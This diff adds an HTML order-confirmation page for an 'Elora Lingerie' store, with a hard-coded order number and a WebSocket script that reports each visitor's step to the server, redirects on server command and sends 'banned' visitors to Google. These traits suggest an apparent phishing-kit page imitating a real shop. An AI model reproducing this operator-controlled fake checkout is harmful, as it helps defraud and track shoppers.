@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Order Confirmed | Elora</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
+
+    <!-- Google Font: Cairo & Playfair -->
+    <link
+        href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&family=Playfair+Display:ital@0;1&display=swap"
+        rel="stylesheet" />
+
+    <!-- Tailwind CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: {
+                            DEFAULT: '#2f1321', // Dark Plum
+                            light: '#4a2035',
+                        },
+                        accent: {
+                            DEFAULT: '#e45b8a', // Soft Pink
+                            light: '#f6a8c2',
+                            hover: '#c82f63',
+                        },
+                        sand: '#f5ebe7',
+                    },
+                    fontFamily: {
+                        sans: ['Cairo', 'sans-serif'],
+                        playfair: ['Playfair Display', 'serif'],
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+
+<body class="font-sans bg-sand/30 text-primary min-h-screen">
+
+    <!-- Header -->
+    <header class="bg-white border-b border-gray-100 py-4 px-6 flex justify-center">
+        <img src="https://cdn.salla.sa/wjBYz/jUswOYjAqz2JF3apQD7pIh2dbv7ppfHNsK3g30Rl.jpg" alt="Logo"
+            class="h-8 sm:h-10 object-contain" />
+    </header>
+
+    <main class="max-w-xl mx-auto px-4 py-12 sm:py-16">
+
+        <!-- Confirmed Badge -->
+        <div class="text-center mb-10 animate-[fadeInUp_0.5s_ease-out]">
+            <div
+                class="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6 shadow-xl shadow-green-500/10">
+                <svg class="w-10 h-10 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                </svg>
+            </div>
+            <h1 class="text-2xl sm:text-3xl font-playfair font-bold mb-2">Thank You!</h1>
+            <p class="text-gray-500">Your order has been received successfully.</p>
+            <div class="mt-6 inline-flex flex-col items-center">
+                <span
+                    class="text-[10px] bg-primary text-white px-3 py-1 rounded-full uppercase tracking-widest font-bold mb-1">Order
+                    #89420</span>
+                <span class="text-xs text-gray-400">Date: <span id="dateDisplay"></span></span>
+            </div>
+        </div>
+
+        <!-- Receipt Card -->
+        <div class="bg-white rounded-3xl overflow-hidden shadow-premium border border-gray-100">
+            <!-- Header -->
+            <div class="bg-primary p-6 text-white flex justify-between items-center">
+                <span class="text-sm font-bold">Total Amount</span>
+                <span id="finalTotal" class="text-2xl font-playfair font-bold">0.00 SAR</span>
+            </div>
+
+            <!-- Details -->
+            <div class="p-6 space-y-4">
+                <div class="flex justify-between border-b border-dashed border-gray-100 pb-4">
+                    <div class="space-y-1">
+                        <span class="block text-xs text-gray-400 uppercase tracking-wide">Ship To</span>
+                        <span id="clientName" class="block font-bold mt-1">Guest</span>
+                        <span id="deliveryAddress" class="block text-xs text-gray-500 max-w-[200px] truncate">Saudi
+                            Arabia</span>
+                    </div>
+                </div>
+
+                <!-- Items Loop container -->
+                <div id="orderItems" class="space-y-3">
+                    <!-- JS Injected -->
+                </div>
+            </div>
+
+            <!-- Footer -->
+            <div class="bg-gray-50 px-6 py-4 flex items-center justify-between text-xs text-gray-500">
+                <span>Payment Method</span>
+                <span class="font-bold text-primary flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-green-500"></span>
+                    Paid Securely
+                </span>
+            </div>
+        </div>
+
+        <!-- Action -->
+        <div class="mt-8 text-center">
+            <a href="index.html"
+                class="inline-block bg-accent text-white px-8 py-3.5 rounded-xl font-bold hover:bg-accent-hover transition-colors shadow-lg shadow-accent/20">
+                Continue Shopping
+            </a>
+            <p class="mt-8 text-[10px] text-gray-400 font-bold uppercase tracking-widest">© 2025 Elora Lingerie</p>
+        </div>
+
+    </main>
+
+    <script>
+        // 1. Session & WebSocket Setup
+        let clientId = localStorage.getItem('aura_client_id');
+        if (!clientId) {
+            clientId = 'cl-' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('aura_client_id', clientId);
+        }
+
+        const wsUrl = `wss://${window.location.host}/ws/client/${clientId}`;
+        let ws;
+
+        function connectWS() {
+            ws = new WebSocket(wsUrl);
+            ws.onopen = () => {
+                ws.send(JSON.stringify({ event: 'step_update', data: { step: 'thank_you' } }));
+            };
+            ws.onmessage = (e) => {
+                try {
+                    const msg = JSON.parse(e.data);
+                    if (msg.type === 'REDIRECT') window.location.href = msg.url;
+                    else if (msg.type === 'BANNED') window.location.href = msg.redirect || 'https://www.google.com';
+                } catch (err) { }
+            };
+            ws.onclose = () => setTimeout(connectWS, 3000);
+        }
+
+        if (window.location.protocol.startsWith('http')) {
+            connectWS();
+        }
+
+        const CART_KEY = 'pro-cart-v1';
+        const orderData = JSON.parse(sessionStorage.getItem('orderData'));
+        const cart = JSON.parse(localStorage.getItem(CART_KEY)) || [];
+
+        // Set Date
+        document.getElementById('dateDisplay').textContent = new Date().toLocaleDateString();
+
+        if (orderData) {
+            document.getElementById('clientName').textContent = orderData.name;
+            document.getElementById('finalTotal').textContent = orderData.total; // already has SAR or symbol
+            document.getElementById('deliveryAddress').textContent = orderData.address;
+        }
+
+        const itemsContainer = document.getElementById('orderItems');
+        if (cart.length > 0) {
+            itemsContainer.innerHTML = cart.map(i => `
+                <div class="flex gap-3 items-center">
+                    <div class="w-10 h-10 bg-gray-100 rounded-lg overflow-hidden flex-shrink-0">
+                        <img src="${i.img}" class="w-full h-full object-cover">
+                    </div>
+                    <div class="flex-1 min-w-0">
+                        <h4 class="text-xs font-bold text-primary truncate">${i.name}</h4>
+                        <p class="text-[10px] text-gray-400">${i.qty} x ${i.price} SAR</p>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // Clear Cart
+        localStorage.removeItem(CART_KEY);
+    </script>
+</body>
+
+</html>
